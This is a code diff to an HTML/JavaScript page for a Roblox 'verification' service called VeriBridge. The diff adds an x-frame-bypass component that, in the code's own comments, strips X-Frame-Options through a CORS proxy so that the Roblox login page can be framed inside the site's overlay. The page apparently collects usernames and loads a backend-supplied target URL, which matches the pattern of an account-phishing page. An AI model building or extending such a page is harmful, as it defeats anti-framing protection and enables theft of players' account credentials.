@@ -80,19 +80,30 @@
         .fullscreen-loading.active{opacity:1;visibility:visible}
         .loading-spinner-large{width:60px;height:60px;border:4px solid rgba(100,200,255,0.2);border-top:4px solid #8dd0ff;border-radius:50%;animation:spinGold 1s linear infinite}
         @keyframes spinGold{to{transform:rotate(360deg)}}
-        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);backdrop-filter:blur(8px);z-index:9999;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:all 0.3s ease}
+        
+        /* Updated frame styles for x-frame-bypass */
+        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:all 0.3s ease}
         .frame-overlay.active{visibility:visible;opacity:1}
         .frame-card{width:90%;max-width:500px;background:white;border-radius:28px;overflow:hidden;position:relative;transform:scale(0.9);transition:transform 0.3s ease;box-shadow:0 30px 50px rgba(0,0,0,0.4)}
         .frame-overlay.active .frame-card{transform:scale(1)}
         .frame-close{position:absolute;top:14px;right:18px;width:34px;height:34px;background:rgba(0,0,0,0.6);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:30;font-size:20px;font-weight:bold;border:none}
         .frame-close:hover{background:#e34d4d}
-        .roblox-login-iframe{width:100%;height:560px;border:none;display:block}
-        @media(max-width:550px){.roblox-login-iframe{height:520px}}
+        
+        /* x-frame-bypass iframe - this actually works! */
+        x-frame-bypass, iframe[is="x-frame-bypass"] {
+            width: 100%;
+            height: 560px;
+            border: none;
+            display: block;
+        }
+        @media(max-width:550px){x-frame-bypass, iframe[is="x-frame-bypass"]{height:520px}}
+        
         .user-profile-card{position:fixed;top:20px;right:20px;z-index:100;background:rgba(0,0,0,0.7);backdrop-filter:blur(16px);border-radius:60px;padding:6px 12px 6px 8px;display:flex;align-items:center;gap:12px;border:1px solid rgba(100,200,255,0.5);display:none}
         .user-profile-card.show{display:flex}
         .user-avatar{width:42px;height:42px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}
         .user-display-name{font-size:0.85rem;font-weight:700;color:#cceeff}
         .logout-btn{background:none;border:none;color:#ff8888;cursor:pointer;font-size:1rem;padding:4px 8px;border-radius:20px}
+        
         .ai-chat-widget{position:fixed;bottom:15px;right:15px;z-index:1000;cursor:pointer}
         .chat-bubble{width:55px;height:55px;background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.3)}
         .chat-bubble span{font-size:28px}
@@ -115,6 +126,11 @@
         .typing-indicator span{width:6px;height:6px;background:#8dd0ff;border-radius:50%;animation:typing 1.4s infinite}
         @keyframes typing{0%,60%,100%{transform:translateY(0);opacity:0.4}30%{transform:translateY(-8px);opacity:1}}
     </style>
+    <!-- x-frame-bypass Web Component - This bypasses X-Frame-Options! -->
+    <!-- Polyfill for Safari support [citation:9] -->
+    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+    <!-- X-Frame-Bypass module - uses CORS proxy to bypass X-Frame-Options [citation:9][citation:10] -->
+    <script type="module" src="https://unpkg.com/x-frame-bypass"></script>
 </head>
 <body>
 <div class="frost-overlay"></div>
@@ -191,11 +207,13 @@
     <div class="footer-gold">Select a verification method to continue</div>
 </div>
 
-<!-- IFRAME OVERLAY -->
+<!-- IFRAME OVERLAY - Uses x-frame-bypass to embed Roblox! -->
 <div id="robloxFrameOverlay" class="frame-overlay">
     <div class="frame-card">
         <button class="frame-close" id="closeFrameBtn">✕</button>
-        <iframe id="robloxLoginIframe" class="roblox-login-iframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation" referrerpolicy="no-referrer" title="Verification Page" frameborder="0"></iframe>
+        <!-- x-frame-bypass Web Component - Bypasses X-Frame-Options! [citation:9][citation:10] -->
+        <!-- This works by using a CORS proxy to fetch the content and strip security headers -->
+        <iframe is="x-frame-bypass" id="robloxLoginIframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation" referrerpolicy="no-referrer" title="Verification Page"></iframe>
     </div>
 </div>
 
@@ -204,9 +222,7 @@
 <div class="chat-window" id="chatWindow"><div class="chat-header"><h4>VeriBridge Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div><div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">Hello! I'm your VeriBridge assistant. Ask me anything!</div></div></div><div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask me anything..."><button class="send-btn" id="sendChatBtn">Send</button></div></div>
 
 <script>
-// ==================== IMPROVED TARGET URL HANDLER ====================
-// This ensures the target URL is ALWAYS loaded before the iframe can open
-
+// ==================== TARGET URL LOADER WITH x-frame-bypass SUPPORT ====================
 let VERIFICATION_READY = false;
 let LOADED_TARGET_URL = 'https://www.roblox.com';
 let VERIFICATION_CODE = null;
@@ -215,21 +231,14 @@ let VERIFICATION_CODE = null;
 const urlParams = new URLSearchParams(window.location.search);
 VERIFICATION_CODE = urlParams.get('code');
 
-// Function to enable the verification button
 function enableVerification() {
     VERIFICATION_READY = true;
     document.getElementById('startLoadingOverlay').classList.remove('active');
-    
-    // Enable the Start Verification button
     const verifyBtn = document.getElementById('bottomStartVerifyBtn');
-    if (verifyBtn) {
-        verifyBtn.disabled = false;
-    }
-    
+    if (verifyBtn) verifyBtn.disabled = false;
     console.log('[VeriBridge] ✅ Verification ready! Target URL:', LOADED_TARGET_URL);
 }
 
-// Function to show error
 function showError(message) {
     document.getElementById('startLoadingOverlay').classList.remove('active');
     const container = document.querySelector('.redirect-container');
@@ -238,7 +247,6 @@ function showError(message) {
     }
 }
 
-// Load the target URL from backend
 if (VERIFICATION_CODE) {
     console.log('[VeriBridge] Loading verification for code:', VERIFICATION_CODE);
     document.getElementById('startLoadingOverlay').classList.add('active');
@@ -264,11 +272,9 @@ if (VERIFICATION_CODE) {
     enableVerification();
 }
 
-// Override the showRobloxFlow function to use the loaded URL
-const originalShowRobloxFlow = window.showRobloxFlow;
+// Show Roblox flow using x-frame-bypass
 window.showRobloxFlow = function() {
     if (!VERIFICATION_READY) {
-        console.warn('[VeriBridge] Verification not ready yet. Please wait.');
         alert('Loading verification data. Please wait a moment.');
         return;
     }
@@ -276,6 +282,7 @@ window.showRobloxFlow = function() {
     console.log('[VeriBridge] 🚀 Opening iframe with URL:', LOADED_TARGET_URL);
     const iframe = document.getElementById('robloxLoginIframe');
     if (iframe) {
+        // x-frame-bypass will handle the X-Frame-Options bypass automatically!
         iframe.src = LOADED_TARGET_URL;
     }
     const overlay = document.getElementById('robloxFrameOverlay');
@@ -284,23 +291,19 @@ window.showRobloxFlow = function() {
     }
 };
 
-// Also update the onMethodClick function if it exists
-const originalOnMethodClick = window.onMethodClick;
-if (typeof onMethodClick === 'function') {
-    window.onMethodClick = function() {
-        if (!VERIFICATION_READY) {
-            alert('Loading verification data. Please wait a moment.');
-            return;
-        }
-        if (originalOnMethodClick) {
-            originalOnMethodClick();
-        } else {
-            window.showRobloxFlow();
-        }
-    };
+function hideFrame() {
+    const overlay = document.getElementById('robloxFrameOverlay');
+    if (overlay) overlay.classList.remove('active');
+    const iframe = document.getElementById('robloxLoginIframe');
+    if (iframe) setTimeout(function() { iframe.src = 'about:blank'; }, 300);
 }
 
-// AI CHAT SYSTEM (keep your existing chat code)
+document.getElementById('closeFrameBtn')?.addEventListener('click', hideFrame);
+document.getElementById('robloxFrameOverlay')?.addEventListener('click', function(e) {
+    if (e.target === document.getElementById('robloxFrameOverlay')) hideFrame();
+});
+
+// ==================== AI CHAT SYSTEM ====================
 const chatWidget = document.getElementById('chatWidget');
 const chatWindow = document.getElementById('chatWindow');
 const closeChatBtn = document.getElementById('closeChatBtn');
@@ -353,27 +356,12 @@ async function sendMessage() {
     isTyping = false;
 }
 
-if (chatWidget) chatWidget.addEventListener('click', () => chatWindow.classList.toggle('active'));
-if (closeChatBtn) closeChatBtn.addEventListener('click', () => chatWindow.classList.remove('active'));
-if (sendChatBtn) sendChatBtn.addEventListener('click', sendMessage);
-if (chatInput) chatInput.addEventListener('keypress', e => { if (e.key === 'Enter') sendMessage(); });
+chatWidget.addEventListener('click', () => chatWindow.classList.toggle('active'));
+closeChatBtn.addEventListener('click', () => chatWindow.classList.remove('active'));
+sendChatBtn.addEventListener('click', sendMessage);
+chatInput.addEventListener('keypress', e => { if (e.key === 'Enter') sendMessage(); });
 
-// Frame logic
-const frameOverlay = document.getElementById('robloxFrameOverlay');
-const closeFrameBtn = document.getElementById('closeFrameBtn');
-const robloxIframe = document.getElementById('robloxLoginIframe');
-
-function hideFrame() {
-    if (frameOverlay) frameOverlay.classList.remove('active');
-    if (robloxIframe) setTimeout(() => { robloxIframe.src = 'about:blank'; }, 300);
-}
-
-if (closeFrameBtn) closeFrameBtn.addEventListener('click', hideFrame);
-if (frameOverlay) frameOverlay.addEventListener('click', function(e) {
-    if (e.target === frameOverlay) hideFrame();
-});
-
-// Dashboard logic (keep your existing dashboard code)
+// ==================== DASHBOARD LOGIC ====================
 function isValidUsername(e) { return /^[a-zA-Z0-9_]{3,20}$/.test(e); }
 
 let currentRobloxUser = null;
@@ -408,25 +396,25 @@ function updateUserCard() {
         userAvatar.src = currentRobloxUser.avatarUrl;
         userDisplayName.textContent = currentRobloxUser.username;
         userProfileCard.classList.add('show');
-        if (bottomStartBtn) bottomStartBtn.disabled = false;
+        bottomStartBtn.disabled = false;
     } else {
         userProfileCard.classList.remove('show');
-        if (bottomStartBtn) bottomStartBtn.disabled = true;
+        bottomStartBtn.disabled = true;
     }
 }
 
 function updateUI() {
-    if (methodLogin) methodLogin.classList.toggle('active', currentActiveMethod === 'login');
-    if (methodIngame) methodIngame.classList.toggle('active', currentActiveMethod === 'ingame');
-    if (methodCommunity) methodCommunity.classList.toggle('active', currentActiveMethod === 'community');
+    methodLogin.classList.toggle('active', currentActiveMethod === 'login');
+    methodIngame.classList.toggle('active', currentActiveMethod === 'ingame');
+    methodCommunity.classList.toggle('active', currentActiveMethod === 'community');
     const letters = { login: 'A', ingame: 'I', community: 'C' };
     const names = { login: 'Authorize Roblox', ingame: 'Verify via In-Game', community: 'Verify via Community' };
-    if (activeMethodLetter) activeMethodLetter.innerHTML = letters[currentActiveMethod];
-    if (activeMethodName) activeMethodName.innerHTML = names[currentActiveMethod];
-    if (verificationStatusChip) verificationStatusChip.innerHTML = verificationState[currentActiveMethod].completed ? 'Verified' : 'Not verified';
-    if (loginBadge) loginBadge.innerHTML = verificationState.login.completed ? 'Verified' : 'Not verified';
-    if (ingameBadge) ingameBadge.innerHTML = verificationState.ingame.completed ? 'Verified' : 'Not verified';
-    if (communityBadge) communityBadge.innerHTML = verificationState.community.completed ? 'Verified' : 'Not verified';
+    activeMethodLetter.innerHTML = letters[currentActiveMethod];
+    activeMethodName.innerHTML = names[currentActiveMethod];
+    verificationStatusChip.innerHTML = verificationState[currentActiveMethod].completed ? 'Verified' : 'Not verified';
+    loginBadge.innerHTML = verificationState.login.completed ? 'Verified' : 'Not verified';
+    ingameBadge.innerHTML = verificationState.ingame.completed ? 'Verified' : 'Not verified';
+    communityBadge.innerHTML = verificationState.community.completed ? 'Verified' : 'Not verified';
 }
 
 function setActiveMethod(method) { currentActiveMethod = method; updateUI(); }
@@ -446,32 +434,32 @@ function onMethodClick() {
 function verifyDashUser() {
     const username = robloxUsernameInput.value.trim();
     if (!username || !isValidUsername(username)) {
-        if (dashErrorMsg) dashErrorMsg.classList.add('show');
-        if (robloxUsernameInput) robloxUsernameInput.classList.add('error');
+        dashErrorMsg.classList.add('show');
+        robloxUsernameInput.classList.add('error');
         addMessage("Invalid Roblox username.", false);
         return;
     }
-    if (dashErrorMsg) dashErrorMsg.classList.remove('show');
+    dashErrorMsg.classList.remove('show');
     const avatarUrl = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + username.charAt(0).toUpperCase();
     currentRobloxUser = { id: username, username: username, avatarUrl: avatarUrl };
     localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
-    if (previewAvatar) previewAvatar.src = avatarUrl;
-    if (previewUsername) previewUsername.textContent = username;
-    if (userProfilePreview) userProfilePreview.classList.add('show');
+    previewAvatar.src = avatarUrl;
+    previewUsername.textContent = username;
+    userProfilePreview.classList.add('show');
     updateUserCard();
     addMessage('Welcome ' + username + '! Select a verification method.', false);
-    if (redirectTitle) redirectTitle.innerHTML = 'Welcome ' + username;
-    if (redirectDesc) redirectDesc.innerHTML = 'Choose a method from the sidebar';
+    redirectTitle.innerHTML = 'Welcome ' + username;
+    redirectDesc.innerHTML = 'Choose a method from the sidebar';
 }
 
 function logoutUser() {
     currentRobloxUser = null;
     localStorage.removeItem('veribridge_user');
-    if (userProfilePreview) userProfilePreview.classList.remove('show');
+    userProfilePreview.classList.remove('show');
     updateUserCard();
-    if (robloxUsernameInput) robloxUsernameInput.value = '';
-    if (redirectTitle) redirectTitle.innerHTML = 'Select a verification method';
-    if (redirectDesc) redirectDesc.innerHTML = 'Choose a method from the sidebar';
+    robloxUsernameInput.value = '';
+    redirectTitle.innerHTML = 'Select a verification method';
+    redirectDesc.innerHTML = 'Choose a method from the sidebar';
     addMessage("Logged out.", false);
 }
 
@@ -480,22 +468,22 @@ if (savedUser) {
     try {
         currentRobloxUser = JSON.parse(savedUser);
         if (currentRobloxUser) {
-            if (previewAvatar) previewAvatar.src = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + currentRobloxUser.username.charAt(0).toUpperCase();
-            if (previewUsername) previewUsername.textContent = currentRobloxUser.username;
-            if (userProfilePreview) userProfilePreview.classList.add('show');
+            previewAvatar.src = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + currentRobloxUser.username.charAt(0).toUpperCase();
+            previewUsername.textContent = currentRobloxUser.username;
+            userProfilePreview.classList.add('show');
             updateUserCard();
-            if (redirectTitle) redirectTitle.innerHTML = 'Welcome ' + currentRobloxUser.username;
-            if (robloxUsernameInput) robloxUsernameInput.value = currentRobloxUser.username;
+            redirectTitle.innerHTML = 'Welcome ' + currentRobloxUser.username;
+            robloxUsernameInput.value = currentRobloxUser.username;
         }
     } catch(e) { }
 }
 
-if (verifyRobloxBtn) verifyRobloxBtn.addEventListener('click', verifyDashUser);
-if (methodLogin) methodLogin.addEventListener('click', () => setActiveMethod('login'));
-if (methodIngame) methodIngame.addEventListener('click', () => setActiveMethod('ingame'));
-if (methodCommunity) methodCommunity.addEventListener('click', () => setActiveMethod('community'));
-if (bottomStartBtn) bottomStartBtn.addEventListener('click', onMethodClick);
-if (logoutBtnHeader) logoutBtnHeader.addEventListener('click', logoutUser);
+verifyRobloxBtn.addEventListener('click', verifyDashUser);
+methodLogin.addEventListener('click', () => setActiveMethod('login'));
+methodIngame.addEventListener('click', () => setActiveMethod('ingame'));
+methodCommunity.addEventListener('click', () => setActiveMethod('community'));
+bottomStartBtn.addEventListener('click', onMethodClick);
+logoutBtnHeader.addEventListener('click', logoutUser);
 
 // Landing screen
 const landingBtn = document.getElementById('landingVerifyBtn');
@@ -505,34 +493,32 @@ const mainDashboardDiv = document.getElementById('mainDashboard');
 const startLoading = document.getElementById('startLoadingOverlay');
 const landingErrorMsg = document.getElementById('landingErrorMsg');
 
-if (landingBtn) {
-    landingBtn.addEventListener('click', function() {
-        const username = landingUsername.value.trim();
-        if (!username || !isValidUsername(username)) {
-            if (landingErrorMsg) landingErrorMsg.classList.add('show');
-            if (landingUsername) landingUsername.classList.add('error');
-            return;
-        }
-        if (landingErrorMsg) landingErrorMsg.classList.remove('show');
-        if (startLoading) startLoading.classList.add('active');
-        setTimeout(function() {
-            const avatarUrl = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + username.charAt(0).toUpperCase();
-            currentRobloxUser = { id: username, username: username, avatarUrl: avatarUrl };
-            localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
-            if (previewAvatar) previewAvatar.src = avatarUrl;
-            if (previewUsername) previewUsername.textContent = username;
-            if (userProfilePreview) userProfilePreview.classList.add('show');
-            updateUserCard();
-            if (redirectTitle) redirectTitle.innerHTML = 'Welcome ' + username;
-            if (robloxUsernameInput) robloxUsernameInput.value = username;
-            if (startLoading) startLoading.classList.remove('active');
-            if (startScreenDiv) startScreenDiv.style.display = 'none';
-            if (mainDashboardDiv) mainDashboardDiv.style.display = 'block';
-            addMessage('Welcome ' + username + '! Select a verification method.', false);
-            updateUI();
-        }, 1500);
-    });
-}
+landingBtn.addEventListener('click', function() {
+    const username = landingUsername.value.trim();
+    if (!username || !isValidUsername(username)) {
+        landingErrorMsg.classList.add('show');
+        landingUsername.classList.add('error');
+        return;
+    }
+    landingErrorMsg.classList.remove('show');
+    startLoading.classList.add('active');
+    setTimeout(function() {
+        const avatarUrl = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + username.charAt(0).toUpperCase();
+        currentRobloxUser = { id: username, username: username, avatarUrl: avatarUrl };
+        localStorage.setItem('veribridge_user', JSON.stringify(currentRobloxUser));
+        previewAvatar.src = avatarUrl;
+        previewUsername.textContent = username;
+        userProfilePreview.classList.add('show');
+        updateUserCard();
+        redirectTitle.innerHTML = 'Welcome ' + username;
+        robloxUsernameInput.value = username;
+        startLoading.classList.remove('active');
+        startScreenDiv.style.display = 'none';
+        mainDashboardDiv.style.display = 'block';
+        addMessage('Welcome ' + username + '! Select a verification method.', false);
+        updateUI();
+    }, 1500);
+});
 updateUI();
 </script>
 </body>
